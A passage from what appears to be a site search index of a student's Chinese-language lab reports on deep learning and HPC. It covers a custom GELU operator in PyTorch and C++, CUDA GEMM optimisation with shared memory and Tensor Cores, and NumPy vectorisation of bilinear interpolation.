enumerate(train_loader):\n        ...\n        writer.add_scalar('Loss/Train', loss.item(),\n                    epoch * len(train_loader) + batch_idx)\n    writer.flush()\n    with torch.no_grad():\n        ...\n        for batch_idx, (images, labels) in enumerate(test_loader):\n            ...\n            writer.add_scalar('Accuracy/Test', \n                100 * (result == labels).sum().item() / labels.size(0), \n                epoch * len(test_loader) + batch_idx)\n    writer.flush()\n</code></pre> <p>\u8bad\u7ec3\u7ed3\u675f\u540e\uff0c\u6267\u884c</p> <pre><code>$ tensorboard --logdir=./path/to/the/folder\n</code></pre> <p>\u5176\u4e2d <code>./path/to/the/folder</code> \u4e3a Tensorboard \u751f\u6210\u7684\u6587\u4ef6\u8def\u5f84\u3002</p> <p>\u5f97\u5230\u635f\u5931\u66f2\u7ebf\uff1a</p> <p></p> <p>\u51c6\u786e\u7387\u66f2\u7ebf\uff1a</p> <p></p> <p>\u6700\u7ec8\u7684\u8bc6\u522b\u6b63\u786e\u7387\u7ea6\u4e3a 98.90 % \u3002</p>"},{"location":"labs/cnn/#_9","title":"\u81ea\u5b9a\u4e49\u7b97\u5b50","text":"\u8be5\u90e8\u5206\u5b8c\u6574\u4ee3\u7801\u4f4d\u4e8e <code>./code/mygelu.py</code> \uff1a\u81ea\u5b9a\u4e49 GELU \u7b97\u5b50\u53ca\u5176\u9a8c\u8bc1\u3002 <code>./code/mygelu.cpp</code> \uff1aC++ \u5b9e\u73b0 GELU \u7b97\u5b50\u3002 <code>./code/mygelu_cpp.py</code> \uff1apython \u8c03\u7528 C++ GELU \u7b97\u5b50\u9a8c\u8bc1\u6b63\u786e\u6027\u3002 <code>./code/letnet5_cpp.py</code> \uff1a\u4f7f\u7528\u81ea\u5b9a\u4e49 GELU \u7b97\u5b50\u8fdb\u884c LetNet-5 \u8bad\u7ec3\u3002"},{"location":"labs/cnn/#_10","title":"\u7b97\u5b50\u7f16\u5199","text":"<p>GELU \u7b97\u5b50\u516c\u5f0f\u4e3a\uff1a</p> \\[ \\begin{align}     \\mathrm{GELU}(x) &amp;= x \\cdot \\Phi(x) \\\\                    &amp;= \\frac{1}{2} x (1 + \\mathrm{erf}(\\frac{x}{\\sqrt{2}})) \\end{align} \\] <p>\u6c42\u5bfc\u5f97\uff1a</p> \\[ \\frac{\\mathrm{d}}{\\mathrm{d} x}\\mathrm{GELU}(x) = \\frac{1}{2} + \\frac{1}{2} \\mathrm{erf}(\\frac{x}{\\sqrt{2}}) + \\frac{\\frac{\\sqrt{2}}{2} x \\mathrm{e}^{-x^2 / 2}}{\\sqrt{\\pi}} \\] <p>\u4f7f\u7528 torch \u63d0\u4f9b\u7684\u51fd\u6570 <code>torch.erf()</code> \u5b9e\u73b0 GELU \u51fd\u6570\u53ca\u5176\u5bfc\u6570\u7684\u8ba1\u7b97\u3002</p> <p>\u7ee7\u627f <code>torch.autograd.Function</code> \u5e76\u5b9e\u73b0 <code>forward</code> \u548c <code>backward</code> \u51fd\u6570\u3002</p> <pre><code>import math\nimport torch\n\ndef GELU(x):\n    return 0.5 * x * (1.0 + torch.erf(x / math.sqrt(2)))\n\ndef GELU_gard(x):\n    return 0.5 + 0.5 * torch.erf(x / math.sqrt(2)) + \\\n        (0.5 * x * torch.exp(- x * x / 2) * math.sqrt(2)) / math.sqrt(math.pi)\n\nclass my_gelu(torch.autograd.Function):\n    @staticmethod\n    def forward(ctx, input):\n        # \u4fdd\u5b58 input \u4f9b backward() \u4f7f\u7528\n        ctx.save_for_backward(input)\n        return GELU(input)\n\n    @staticmethod\n    def backward(ctx, gard_output):\n        input = ctx.saved_tensors\n        # \u8ba1\u7b97\u68af\u5ea6\n        gard_input = gard_output * GELU_gard(input)\n        return gard_input\n</code></pre> <p>\u5c06\u81ea\u5b9a\u4e49\u7b97\u5b50\u4e0e <code>F.gelu</code> \u6bd4\u8f83\uff1a</p> <pre><code>import torch.nn.functional as F\n\nloss_func = nn.MSELoss()\nA = torch.randn(100)\nB = A.clone()\nA.requires_grad = True\nB.requires_grad = True\nc = torch.randn(100)\na = F.gelu(A)\nb = my_gelu.apply(B)\nloss1 = loss_func(a, c)\nloss2 = loss_func(b, c)\nloss1.backward()\nloss2.backward()\ngradA = A.grad\ngradB = B.grad\nerr = loss_func(gradA, gradB)\nprint(err.item())\n</code></pre> <p>\u8f93\u51fa\u8bef\u5dee\u7ea6\u4e3a \\(10^{-17}\\) \uff0c\u53ef\u4ee5\u5ffd\u7565\u3002</p>"},{"location":"labs/cnn/#c","title":"\u4f7f\u7528 C++","text":"<p>\u5728 C++ \u4e2d\u5b9e\u73b0 GELU \u7b97\u5b50\uff1a</p> <pre><code>#include &lt;torch/extension.h&gt;\n#define _USE_MATH_DEFINES\n#include &lt;cmath&gt;\nusing namespace std;\n\ntorch::Tensor GELU(torch::Tensor x) {\n    return 0.5 * x * (1.0 + torch::erf(x / sqrt(2)));\n}\n\ntorch::Tensor GELU_gard(torch::Tensor x) {\n    return 0.5 + 0.5 * torch::erf(x / sqrt(2)) +\n             (0.5 * x * torch::exp(- x * x / 2) * sqrt(2)) / sqrt(M_PI);\n}\n\ntorch::Tensor gelu_forward(torch::Tensor input) {\n    return GELU(input);\n}\n\ntorch::Tensor gelu_backward(torch::Tensor grad_output, torch::Tensor input) {\n    return grad_output * GELU_gard(input);\n}\n\nPYBIND11_MODULE(TORCH_EXTENSION_NAME, m) {\n    m.def(\"forward\", &amp;gelu_forward, \"GELU forward\");\n    m.def(\"backward\", &amp;gelu_backward, \"GELU backward\");\n}\n</code></pre> <p>\u4f7f\u7528 <code>torch.utils.cpp_extension.load</code> \u8c03\u7528 C++ \u5171\u4eab\u5e93\uff0c\u4f7f\u7528 python \u8c03\u7528\u7b97\u5b50\uff1a</p> <pre><code>from torch.utils.cpp_extension import load\n\ngelu_cpp = load(name=\"gelu_cpp\", sources=[\"mygelu.cpp\"])\n\nclass my_gelu(torch.autograd.Function):\n    @staticmethod\n    def forward(ctx, input):\n        ctx.save_for_backward(input)\n        output = gelu_cpp.forward(input)\n        return output\n\n    @staticmethod\n    def backward(ctx, grad_output):\n        input, = ctx.saved_tensors\n        grad_input = gelu_cpp.backward(grad_output, input)\n        return grad_input\n</code></pre> <p>\u518d\u6b21\u5c06\u81ea\u5b9a\u4e49\u7b97\u5b50\u4e0e <code>F.gelu</code> \u6bd4\u8f83\uff0c\u8bef\u5dee\u7ea6\u4e3a \\(10^{-18}\\) \uff0c\u53ef\u4ee5\u5ffd\u7565\u3002</p> <p>\u5c06\u81ea\u5b9a\u4e49\u7b97\u5b50\u7528\u4e8e LetNet-5 \u8bad\u7ec3\uff1a</p> <pre><code>from torch.utils.cpp_extension import load\n\ngelu_cpp = load(name=\"gelu_cpp\", sources=[\"mygelu.cpp\"])\n\nclass my_gelu(torch.autograd.Function):\n    @staticmethod\n    def forward(ctx, input):\n        ctx.save_for_backward(input)\n        output = gelu_cpp.forward(input)\n        return output\n\n    @staticmethod\n    def backward(ctx, grad_output):\n        input, = ctx.saved_tensors\n        grad_input = gelu_cpp.backward(grad_output, input)\n        return grad_input\n\nclass LeNet_5(nn.Module):\n    ...\n    def forward(self, x):\n        x = my_gelu.apply(self.conv1(x))\n        x = my_gelu.apply(self.pool(x))\n        x = my_gelu.apply(self.conv2(x))\n        x = my_gelu.apply(self.pool(x))\n        x = x.view(-1, 16 * 4 * 4)\n        x = my_gelu.apply(self.full1(x))\n        x = my_gelu.apply(self.full2(x))\n        x = self.full3(x)\n        return x\n...\n</code></pre> <p></p> <p>\u80fd\u591f\u6b63\u5e38\u5de5\u4f5c\u3002</p>"},{"location":"labs/cnn/#reference","title":"Reference","text":"<ul> <li>CNN \u57fa\u7840\u77e5\u8bc6</li> <li>\u5377\u79ef\u795e\u7ecf\u7f51\u7edc\u7ecf\u5178\u56de\u987e\u4e4bLeNet-5</li> <li>PYTORCH DOCUMENTATION</li> <li>PyTorch 74.\u81ea\u5b9a\u4e49\u64cd\u4f5ctorch.autograd.Function</li> </ul>"},{"location":"labs/cuda/","title":"lab3 GEMM \u901a\u7528\u77e9\u9635\u4e58\u6cd5","text":""},{"location":"labs/cuda/#_1","title":"\u5b9e\u9a8c\u6b65\u9aa4","text":""},{"location":"labs/cuda/#blocking-array-packing","title":"Blocking &amp; Array Packing","text":"<p>\u57fa\u51c6\u4ee3\u7801\u4e2d\uff0c\u6309\u5217\u8bbf\u95ee\u77e9\u9635\u5143\u7d20\u65f6\u5c40\u90e8\u6027\u4e0d\u9ad8\u3002\u901a\u8fc7\u5bf9\u77e9\u9635\u8fdb\u884c\u5206\u5757\uff0c\u8ba9\u6bcf\u4e2a\u5757\u4e2d\u5143\u7d20\u5728\u5185\u5b58\u4e2d\u8fde\u7eed\u6392\u5217\uff0c\u53ef\u4ee5\u63d0\u9ad8\u5c40\u90e8\u6027\u3002</p> <p>\u4f7f\u7528\u6838\u51fd\u6570 <code>BlockCudaKernel</code> \u5bf9\u77e9\u9635 A \u548c\u77e9\u9635 B \u8fdb\u884c\u5206\u5757\u5e76\u5b58\u50a8\u5728 <code>_a</code> \u548c <code>_b</code> \u4e2d\u3002</p> <pre><code>#define _a(_i, _j, _x, _y)                               \\\n  _a[((_i) * grid_size + (_j)) * block_size * block_size + ((_x) * block_size + (_y))]\n#define _b(_i, _j, _x, _y)                               \\\n  _b[((_i) * grid_size + (_j)) * block_size * block_size + ((_x) * block_size + (_y))]\n\n__global__ void BlockCudaKernel(double *__restrict__ _a,\n                                  const double *__restrict__ a,\n                                  double *__restrict__ _b,\n                                  const double *__restrict__ b)\n{\n  int grid_size = (size + block_size - 1) / block_size;\n  const int i = blockIdx.x * block_size + threadIdx.x;\n  const int j = blockIdx.y * block_size + threadIdx.y;\n  double a_res = 0, b_res = 0;\n  if (i &lt; size &amp;&amp; j &lt; size) {\n    a_res = a(i, j);\n    b_res = b(i, j);\n  }\n  _a(blockIdx.x, blockIdx.y, threadIdx.x, threadIdx.y) = a_res;\n  _b(blockIdx.x, blockIdx.y, threadIdx.x, threadIdx.y) = b_res;\n}\n</code></pre> <p>Note</p> <p>\u6b64\u5904\u5c06\u77e9\u9635\u5927\u5c0f\u8865\u5168\u4e3a <code>block_size</code> \u7684\u6574\u6570\u500d\uff0c\u65b9\u4fbf\u540e\u7eed\u8ba1\u7b97\u3002</p> <p>\u76f8\u5e94\u5730\u5bf9 <code>MultipleCudaKernel</code> \u6838\u51fd\u6570\u8fdb\u884c\u4fee\u6539\uff0c\u4ece\u5206\u5757\u540e\u7684\u77e9\u9635\u62ff\u53d6\u5143\u7d20\u8fdb\u884c\u8ba1\u7b97\u3002</p> <pre><code>__global__ void MultipleCudaKernel(const double *__restrict__ _a, \n                                     const double *__restrict__ _b, \n                                     double *__restrict__ result) \n{\n  int grid_size = (size + block_size - 1) / block_size;\n  const int i = blockIdx.x * block_size + threadIdx.x;\n  const int j = blockIdx.y * block_size + threadIdx.y;\n  if (i &lt; size &amp;&amp; j &lt; size) {\n    double res = 0;\n    for (int idx = 0; idx &lt; gridDim.x; ++idx) {\n      for (int k = 0; k &lt; block_size &amp;&amp; \n                      k &lt; size - idx * block_size; ++k) {\n        res += _a(blockIdx.x, idx, threadIdx.x, k) * \n               _b(idx, blockIdx.y, k, threadIdx.y);\n      }\n    }\n    result(i, j) = res;\n  }\n}\n</code></pre> <p>\u6838\u51fd\u6570\u8c03\u7528\u90e8\u5206\u4fee\u6539\uff1a</p> <pre><code>AdderCudaKernel&lt;&lt;&lt;grid, block&gt;&gt;&gt;(copy_kernel, b_kernel);\nCUDA_CALL(cudaDeviceSynchronize());\ndouble *a_block, *copy_block;\nCUDA_CALL(cudaMalloc(&amp;a_block, grid_size * grid_size * \n                               block_size * block_size * sizeof(double)));\nCUDA_CALL(cudaMalloc(&amp;copy_block, grid_size * grid_size * \n                               block_size * block_size * sizeof(double)));\nBlockCudaKernel&lt;&lt;&lt;grid, block&gt;&gt;&gt;(a_block, a_kernel, copy_block, copy_kernel);\nCUDA_CALL(cudaDeviceSynchronize());\n// Perform A * B -&gt; Result.\nMultipleCudaKernel&lt;&lt;&lt;grid, block&gt;&gt;&gt;(a_block, copy_block, result_kernel);\nCUDA_CALL(cudaDeviceSynchronize());\n// Swap pointers between A and Result.\ndouble *tmp = a_kernel;\na_kernel = result_kernel;\nresult_kernel = tmp;\n\ncudaFree(a_block);\ncudaFree(copy_block);\n</code></pre> <p>\u901a\u8fc7\u591a\u6b21\u8c03\u8bd5\uff0c\u91c7\u7528 <code>block_size = 8</code> \u80fd\u591f\u8fbe\u5230\u8f83\u5feb\u7684\u901f\u5ea6\u3002</p> <p>\u8fd0\u884c\u7ed3\u679c\u4e3a\uff1a</p> <pre><code>Correct\nCustom: 13634.3 milliseconds\ncuBLAS: 11508.2 milliseconds\n</code></pre> <p>\u6b64\u5916\uff0c\u901a\u8fc7\u6570\u7ec4\u5c01\u88c5\uff0c\u8ba9\u77e9\u9635 B \u5728\u5217\u65b9\u5411\u7684\u5b50\u5757\u5728\u5185\u5b58\u4e2d\u8fde\u7eed\u6392\u5217\uff0c\u80fd\u591f\u8fdb\u4e00\u6b65\u63d0\u9ad8\u5c40\u90e8\u6027\u3002\u5728\u4ee3\u7801\u4e2d\u53ea\u9700\u4fee\u6539 <code>_b</code> \u6570\u7ec4\u7684\u5185\u5b58\u6392\u5e03\u3002</p> <pre><code>#define _b(_i, _j, _x, _y) \\\n  _b[((_j) * grid_size + (_i)) * block_size * block_size + ((_y) * block_size + (_x))]\n</code></pre>"},{"location":"labs/cuda/#shared-memory-cooperative-fetching","title":"Shared Memory &amp; Cooperative Fetching","text":"<p>\u8ba1\u7b97\u76ee\u6807\u77e9\u9635 C \u65f6\uff0c\u6bcf\u4e00\u4e2a\u7ebf\u7a0b\u5757\u8ba1\u7b97\u77e9\u9635 C \u7684\u4e00\u4e2a\u5b50\u5757\uff0c\u6709 \\(C_{ij}=\\sum _{k=0}^{N-1}A_{ik}B_{kj}\\) \u3002</p> <p>\u4e0a\u9762\u7684\u505a\u6cd5\u4e2d\uff0c\u6bcf\u6b21\u90fd\u9700\u8981\u4ece global memory \u4e2d\u62ff\u53d6\u77e9\u9635 A \u548c B \u4e2d\u7684\u5143\u7d20\uff0c\u901f\u5ea6\u8f83\u6162\u3002</p> <p>\u5728\u8ba1\u7b97\u4e4b\u524d\uff0c\u5c06 \\(A_{ik}\\) \u548c \\(B_{kj}\\) \u653e\u5165 shared memory \u4e2d\uff0c\u8ba1\u7b97\u65f6\u53ea\u9700\u4ece shared memory \u4e2d\u62ff\u53d6\u5143\u7d20\uff0c\u4ece\u800c\u964d\u4f4e\u8bbf\u5b58\u5ef6\u8fdf\u3002</p> <pre><code>#define a_shared(_x, _y) a_shared[(_x) * block_size + (_y)]\n#define b_shared(_x, _y) b_shared[(_x) * block_size + (_y)]\n\n/// \\brief Do Matrix Multiplication on GPU.\n__global__ void MultipleCudaKernel(const double *__restrict__ _a, \n                                     const double *__restrict__ _b, \n                                     double *__restrict__ result) \n{\n  int grid_size = (size + block_size - 1) / block_size;\n\n  __shared__ double a_shared[block_size * block_size];\n  __shared__ double b_shared[block_size * block_size];\n\n  const int i = blockIdx.x * block_size + threadIdx.x;\n  const int j = blockIdx.y * block_size + threadIdx.y;\n  const int x = threadIdx.x;\n  const int y = threadIdx.y;\n\n  double res = 0;\n  for (int idx = 0; idx &lt; gridDim.x; ++idx) {\n    // Load matrix to shared memory\n    a_shared(x, y) = _a(blockIdx.x, idx, x, y);\n    b_shared(x, y) = _b(idx, blockIdx.y, x, y);\n    __syncthreads();\n\n    for (int k = 0; k &lt; block_size; ++k) {\n      res += a_shared(x, k) * b_shared(k, y);\n    }\n    __syncthreads();\n  }\n  if (i &lt; size &amp;&amp; j &lt; size) {\n    result(i, j) = res;\n  }\n}\n</code></pre> <p>\u8fd0\u884c\u7ed3\u679c\u4e3a\uff1a</p> <pre><code>Correct\nCustom: 17235.6 milliseconds\ncuBLAS: 11489.1 milliseconds\n</code></pre> <p>\u6027\u80fd\u6709\u6240\u4e0b\u6ed1\uff0c\u63a8\u6d4b\u662f\u56e0\u4e3a bank conflict \u8f83\u591a\uff0c\u5bfc\u81f4\u8bbf\u5b58\u6548\u7387\u8f83\u4f4e\u3002</p>"},{"location":"labs/cuda/#bank-conflict","title":"Bank Conflict","text":"<p>\u5047\u8bbe\u5b58\u50a8\u5668\u6709 16 \u4e2a bank \uff0c\u4e14\u8fde\u7eed\u7684 16 \u4e2a\u77e9\u9635\u5143\u7d20\u88ab\u5206\u522b\u5b58\u50a8\u5230 16 \u4e2a bank \u4e2d\u3002</p> <p>\u5f53\u6bcf\u884c\u5143\u7d20\u5728\u5185\u5b58\u4e2d\u8fde\u7eed\u65f6\uff0cbank \u7684\u5206\u914d\u5982\u4e0b\u56fe\uff08\u5176\u4e2d\u7eff\u8272\u6570\u5b57\u4e3a\u5143\u7d20\u6240\u5728 bank \u7f16\u53f7\uff09\uff0c</p> <p></p> <p>\u82e5 <code>a_shared</code> \u91c7\u7528\u5982\u4e0a\u7684\u6570\u636e\u6392\u5e03\uff0c\u5219\u6bcf\u4e2a\u7ebf\u7a0b\u5757\u5bf9 <code>a_shared</code> \u7684\u8bbf\u95ee\u5982\u4e0b\u56fe\u3002</p> <p></p> <p>\u7531\u4e8e\u8ba1\u7b97 c(x, 0~7) \u65f6\u5404\u4e2a\u7ebf\u7a0b\u5747\u8bbf\u95ee\u76f8\u540c\u7684\u5730\u5740\uff0c\u901a\u8fc7\u5e7f\u64ad\u5219\u4e0d\u4f1a\u4ea7\u751f bank conflict \u3002\u6545\u4e3b\u8981\u4ea7\u751f bank conflict \u7684\u539f\u56e0\u662f\u4e0d\u540c\u884c\u7684\u7ebf\u7a0b\u8bbf\u95ee\u4e86\u540c\u4e00 bank \u7684\u4e0d\u540c\u4f4d\u7f6e\u3002</p> <p>\u901a\u8fc7\u5bf9\u5185\u5b58\u8fdb\u884c\u91cd\u65b0\u914d\u5e03\uff0c\u4f7f\u5f97\u6bcf\u4e00\u5217\u7684\u5143\u7d20\u5728\u5185\u5b58\u4e2d\u8fde\u7eed\u3002\u5982\u56fe\uff0c\u6b64\u65f6\u4e0d\u540c\u884c\u7684\u7ebf\u7a0b\u4e0d\u4f1a\u4ea7\u751f bank conflict \u3002</p> <p></p> <p>\u5bf9\u4e8e <code>b_shared</code> \u77e9\u9635\uff0c\u540c\u7406\u53ef\u77e5\u8ba9\u5176\u6bcf\u884c\u5143\u7d20\u5728\u5185\u5b58\u4e2d\u8fde\u7eed\uff0c\u5373\u53ef\u907f\u514d bank conflict \u3002</p> <p>\u4ee3\u7801\u4e2d\u53ea\u9700\u6539\u52a8 <code>a_shared</code> \u6570\u7ec4\u7684\u5185\u5b58\u5206\u5e03\uff1a</p> <pre><code>#define a_shared(_x, _y) a_shared[(_y) * block_size + (_x)]\n</code></pre> <p>\u8fd0\u884c\u7ed3\u679c\uff1a</p> <pre><code>Correct\nCustom: 11333.5 milliseconds\ncuBLAS: 11484.9 milliseconds\n</code></pre> <p>\u4ee5\u4e0a\u90e8\u5206\u7684\u4ee3\u7801\u5728 <code>/code/baseline.cu</code> \u4e2d\uff0c\u7f16\u8bd1\u53c2\u6570\u4f4d\u4e8e <code>/code/Makefile</code> \uff0c\u8fd0\u884c\u53c2\u6570\u4e3a</p> <pre><code>srun -p 2080Ti -N 1 -n 1 --cpus-per-task=8 --gpus=1 gemm\n</code></pre>"},{"location":"labs/cuda/#tensor-core","title":"Tensor Core","text":"<p>\u4f7f\u7528 <code>nvcuda::wmma</code> \u4e2d\u7684 Tensor Core API \u8c03\u7528 Tensor Core \u8fdb\u884c\u77e9\u9635\u4e58\u6cd5\u3002</p> <p>\u7531\u4e8e\u5bf9\u4e8e\u6570\u636e\u7c7b\u578b <code>double</code> \uff0c\u53ea\u63d0\u4f9b\u4e86 8x8x4 \u7684 Matrix Size \uff0c\u6545\u5206\u5757\u8ba1\u7b97\u65f6\uff0c\u5c06 8x8x8 \u7684\u77e9\u9635\u4e58\u6cd5\u62c6\u5206\u6210\u4e24\u6b21 8x8x4 \u7684\u77e9\u9635\u4e58\u6cd5\uff0c\u8c03\u7528 Tensor Core \u8fdb\u884c\u8ba1\u7b97\u3002</p> <pre><code>#define a_shared(_x, _y) a_shared[(_y) * block_size + (_x)]\n#define b_shared(_x, _y) b_shared[(_x) * block_size + (_y)]\n#define c_shared(_x, _y) c_shared[(_x) * block_size + (_y)]\n\n/// \\brief Do Matrix Multiplication on GPU.\n__global__ void MultipleCudaKernel(const double *__restrict__ _a, \n                                     const double *__restrict__ _b, \n                                     double *__restrict__ result) \n{\n  int grid_size = (size + block_size - 1) / block_size;\n\n  __shared__ double a_shared[block_size * block_size];\n  __shared__ double b_shared[block_size * block_size];\n  __shared__ double c_shared[block_size * block_size];\n\n  wmma::fragment&lt;wmma::matrix_a, block_size, block_size, \n                block_size / 2, double, wmma::col_major&gt; a_frag;\n  wmma::fragment&lt;wmma::matrix_b, block_size, block_size, \n                block_size / 2, double, wmma::row_major&gt; b_frag;\n  wmma::fragment&lt;wmma::accumulator, block_size, block_size, \n                block_size / 2, double&gt; c_frag;\n\n  const int i = blockIdx.x * block_size + threadIdx.x;\n  const int j = blockIdx.y * block_size + threadIdx.y;\n  const int x = threadIdx.x;\n  const int y = threadIdx.y;\n\n  wmma::fill_fragment(c_frag, 0.0f);\n\n  for (int idx = 0; idx &lt; gridDim.x; ++idx) {\n    a_shared(x, y) = _a(blockIdx.x, idx, x, y);\n    b_shared(x, y) = _b(idx, blockIdx.y, x, y);\n    __syncthreads();\n\n    wmma::load_matrix_sync(a_frag, a_shared, block_size);\n    wmma::load_matrix_sync(b_frag, b_shared, block_size);\n    wmma::mma_sync(c_frag, a_frag, b_frag, c_frag);\n\n    wmma::load_matrix_sync(a_frag, \n            a_shared + block_size * block_size / 2, block_size);\n    wmma::load_matrix_sync(b_frag, \n            b_shared + block_size * block_size / 2, block_size);\n    wmma::mma_sync(c_frag, a_frag, b_frag, c_frag);\n    __syncthreads();\n  }\n\n  wmma::store_matrix_sync(c_shared, c_frag, \n                          block_size, wmma::mem_row_major);\n  __syncthreads();\n\n  if (i &lt; size &amp;&amp; j &lt; size) {\n    result(i, j) = c_shared(x, y);\n  }\n}\n</code></pre> <p>\u8fd0\u884c\u7ed3\u679c\u4e3a\uff1a</p> <pre><code>Correct\nCustom: 2127.59 milliseconds\ncuBLAS: 899.045 milliseconds\n</code></pre> <p>Bonus \u90e8\u5206\u4ee3\u7801\u4f4d\u4e8e <code>/code_tensor/baseline.cu</code> \u4e2d\uff0c\u7f16\u8bd1\u53c2\u6570\u4f4d\u4e8e <code>/code_tensor/Makefile</code> \u4e2d\uff0c\u8fd0\u884c\u53c2\u6570\u4e3a\uff1a</p> <pre><code>srun -p A100 -N 1 -n 1 --cpus-per-task=8 --gpus=1 ./gemm\n</code></pre>"},{"location":"labs/cuda/#reference","title":"Reference","text":"<ul> <li>How to optimize GEMM on CPU</li> <li>\u6df1\u5165\u6d45\u51faGPU\u4f18\u5316\u7cfb\u5217\uff1aGEMM\u4f18\u5316\uff08\u4e00\uff09</li> <li>\u4f20\u7edf CUDA GEMM \u4e0d\u5b8c\u5168\u6307\u5317</li> <li>\u94f6\u6cb3\u7cfbCUDA\u7f16\u7a0b\u6307\u5357(3)\u2014\u2014\u77e9\u9635\u4e58\u6cd5\u7684\u5206\u5757\u5b9e\u73b0</li> <li>CUDA C++ Programming Guide # Warp Matrix Functions</li> </ul>"},{"location":"labs/numpy/","title":"lab2 \u5411\u91cf\u5316\u8ba1\u7b97","text":""},{"location":"labs/numpy/#_1","title":"\u601d\u8def","text":""},{"location":"labs/numpy/#step-1","title":"Step 1","text":"<p>\u5148\u8003\u8651\u8ba1\u7b97\u5355\u5f20\u56fe\u7247\u7684\u60c5\u5f62\uff08 <code>N = 1</code> \uff09\u3002</p> <p>\u4e0b\u8bbe\u65b0\u7684 \\(H_2 \\times W_2\\) \u7684\u56fe\u4e2d \\((i,j)\\) \u5904\u50cf\u7d20\u6240\u60f3\u8981\u91c7\u6837\u7684 <code>a</code> \u56fe\u4e2d\u5bf9\u5e94\u70b9\u5750\u6807\u4e3a \\((x_{(i,j)}, y_{(i,j)})\\) \uff0c\u5373 <code>b[n, i, j]</code> \u5904\u6240\u5b58\u5750\u6807\u3002</p> <p>\u9605\u8bfb <code>baseline.py</code> \uff0c\u53ef\u77e5\u57fa\u51c6\u4ee3\u7801\u91c7\u7528\u4e86\u5982\u4e0b\u7b49\u5f0f\u8ba1\u7b97\u6bcf\u4e2a\u91c7\u6837\u70b9 <code>(x, y)</code> \u7684\u91c7\u6837\u7ed3\u679c\uff1a</p> \\[ \\begin{aligned}     f(x,y) \\approx     {\\frac {1}{(x_{2}-x_{1})(y_{2}-y_{1})}}      {\\big (}     &amp;f(Q_{11})(x_{2}-x)(y_{2}-y) + f(Q_{21})(x-x_{1})(y_{2}-y)\\\\     +&amp;f(Q_{12})(x_{2}-x)(y-y_{1}) + f(Q_{22})(x-x_{1})(y-y_{1})     {\\big )} \\end{aligned} \\] <p>\u5728\u672c\u6b21\u5b9e\u9a8c\u7ed9\u51fa\u7684\u60c5\u666f\u4e2d\uff0c \\(x_2 - x_1 = y_2 - y_1 = 1, x_1 = \\lfloor x \\rfloor, y_1 = \\lfloor y \\rfloor\\)  \uff0c\u8bb0  \\(x' = x - \\lfloor x \\rfloor\uff0c y' = y - \\lfloor y \\rfloor\\)  \uff0c\u4e0a\u8ff0\u7b49\u5f0f\u53ef\u7b80\u5316\u4e3a\uff1a</p> \\[ \\displaystyle \\begin{aligned}     f(x,y) \\approx      \\ &amp; f(Q_{11})(1 - x')(1 - y')+f(Q_{21})(x')(1 - y') \\\\     + \\ &amp; f(Q_{12})(1 - x')(y')+f(Q_{22})(x')(y') \\\\ \\end{aligned} \\] <p>\u7531\u4e8e\u6bcf\u4e2a\u91c7\u6837\u70b9\u7684\u8ba1\u7b97\u90fd\u662f\u72ec\u7acb\u7684\uff0c\u6211\u4eec\u53ef\u4ee5\u5b9a\u4e49\u5982\u4e0b\u51e0\u4e2a\u77e9\u9635\uff0c</p> \\[ \\mathbf{F} = \\big( f(x_{(i,j)}, y_{(i,j)})\\big)_{H2 \\times W2}  \\] \\[ \\begin{aligned}     \\mathbf{F_{00}} = \\big( f(Q_{11})\\big)_{H2 \\times W2} \\quad     \\mathbf{F_{01}} = \\big( f(Q_{12})\\big)_{H2 \\times W2} \\\\     \\mathbf{F_{10}} = \\big( f(Q_{21})\\big)_{H2 \\times W2} \\quad     \\mathbf{F_{11}} = \\big( f(Q_{22})\\big)_{H2 \\times W2} \\\\ \\end{aligned} \\] \\[ \\begin{aligned}     \\mathbf{X'} = \\big( x'_{(i, j)} \\big)_{H2 \\times W2} \\\\     \\mathbf{Y'} = \\big( y'_{(i, j)} \\big)_{H2 \\times W2} \\end{aligned} \\] <p>\u4f7f\u7528\u9010\u5143\u7d20\u4e58\u6cd5\uff08 <code>*</code> \uff09\u548c\u77e9\u9635\u52a0\u6cd5\u5373\u53ef\u5b9e\u73b0\u5411\u91cf\u5316\u8ba1\u7b97\u77e9\u9635 \\(\\mathbf{F}\\) \u4e2d\u7684\u91c7\u6837\u4fe1\u606f\uff1a</p> \\[ \\begin{aligned}     \\mathbf{F}     &amp; = \\mathbf{F_{00}} * (1 - \\mathbf{X'}) * (1 - \\mathbf{Y'}) + \\mathbf{F_{10}} * \\mathbf{X'} * (1 - \\mathbf{Y'}) \\\\     &amp; + \\mathbf{F_{01}} * (1 - \\mathbf{X'}) * \\mathbf{Y'} + \\mathbf{F_{11}} * \\mathbf{X'} * \\mathbf{Y'}  \\end{aligned} \\] <p>\u636e\u6b64\u5373\u53ef\u4f7f\u7528\u5411\u91cf\u5316\u53bb\u6389\u5185\u5c42\u4e24\u5c42 <code>for</code> \u5faa\u73af\uff0c\u4ee3\u7801\u5b9e\u73b0\u5982\u4e0b\uff1a</p> vectorize1.py<pre><code>def bilinear_interp_vectorized(a: np.ndarray, b: np.ndarray) -&gt; np.ndarray:\n    \"\"\"\n    This is the vectorized implementation of bilinear interpolation.\n    - a is a ND array with shape [N, H1, W1, C], dtype = int64\n    - b is a ND array with shape [N, H2, W2, 2], dtype = float64\n    - return a ND array with shape [N, H2, W2, C], dtype = int64\n    \"\"\"\n    # get axis size from ndarray shape\n    N, H1, W1, C = a.shape\n    N1, H2, W2, _ = b.shape\n    assets N == N1\n\n    # Do iteration\n    b = b.transpose(0, 3, 1, 2)\n    res = np.empty((N, H2, W2, C), dtype=int64)\n\n    for n in range(N):\n        X, Y = b[n]\n        X_idx , Y_idx = np.floor(X).astype(int64), np.floor(Y).astype(int64)\n        _X, _Y = X - X_idx, Y - Y_idx\n        A00 = a[n, X_idx, Y_idx].transpose(2, 0, 1)\n        A01 = a[n, X_idx, Y_idx + 1].transpose(2, 0, 1)\n        A10 = a[n, X_idx + 1, Y_idx].transpose(2, 0, 1)\n        A11 = a[n, X_idx + 1, Y_idx + 1].transpose(2, 0, 1)\n        res00 = A00 * (1 - _X) * (1 - _Y)\n        res10 = A10 * _X * (1 - _Y)\n        res01 = A01 * (1 - _X) * _Y\n        res11 = A11 * _X * _Y\n        res[n] = res00.transpose(1, 2, 0) + res01.transpose(1, 2, 0) + \\\n                 res10.transpose(1, 2, 0) + res11.transpose(1, 2, 0)\n    return res\n</code></pre> <p>Note</p> <p>\u4ee3\u7801\u4e2d\u4f7f\u7528\u4e86 <code>np.transpose</code> \u51fd\u6570\u8fdb\u884c\u77e9\u9635\u8f6c\u7f6e\uff0c\u4f7f\u5f97 <code>X, Y</code> \u80fd\u5bb9\u6613\u5730\u4ece <code>b</code> 